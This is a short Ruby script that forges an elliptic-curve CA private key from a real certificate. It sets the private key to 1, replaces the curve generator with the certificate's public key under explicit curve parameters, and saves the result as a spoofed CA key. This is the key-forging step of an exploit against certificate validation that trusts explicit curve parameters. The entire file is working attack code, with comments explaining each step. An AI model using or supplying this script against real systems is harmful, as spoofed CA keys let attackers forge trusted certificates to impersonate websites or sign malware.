require 'openssl'

# Open the certificate
raw = File.read ARGV[0]

# Read the certificate using openssl
ca = OpenSSL::X509::Certificate.new(raw) # Read certificate

# extract the Public Key from the Certificate
ca_key = ca.public_key

# Set 1 as a private key  to allow Q=G
ca_key.private_key = 1 # Set a private key, which will match Q = d'G'

# Get the group, Which contains the curve parameters
group = ca_key.group

# Set the Generator to be the Public key
group.set_generator(ca_key.public_key, group.order, group.cofactor)

# Ensure that we are recognized as a EXPLICIT_CURVE
group.asn1_flag = OpenSSL::PKey::EC::EXPLICIT_CURVE

# Set the new Group with the Fake Generator G' = Q
ca_key.group = group

# write the fake key to the system
File.open("FakeCertificates/spoofed_ca.key", 'w') { |f| f.write ca_key.to_pem }
